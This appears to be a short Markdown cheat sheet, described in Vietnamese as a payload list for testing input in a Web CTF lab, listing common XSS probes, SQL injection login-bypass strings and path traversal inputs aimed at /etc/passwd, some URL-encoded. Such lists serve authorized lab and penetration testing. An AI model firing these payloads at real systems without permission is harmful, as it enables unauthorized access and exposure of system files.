---
title: "Burp Payload Quicklist"
description: "Một danh sách payload ngắn để test input trong lab Web CTF."
date: 2026-05-21
tags: [burp, payload, web, checklist]
difficulty: note
language: text
---

## XSS probes

```text
"><svg onload=alert(1)>
<img src=x onerror=alert(1)>
<script>alert(1)</script>
```

## SQLi probes

```text
'
" 
' OR '1'='1' --
') OR ('1'='1' --
```

## Path traversal probes

```text
../
../../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
```
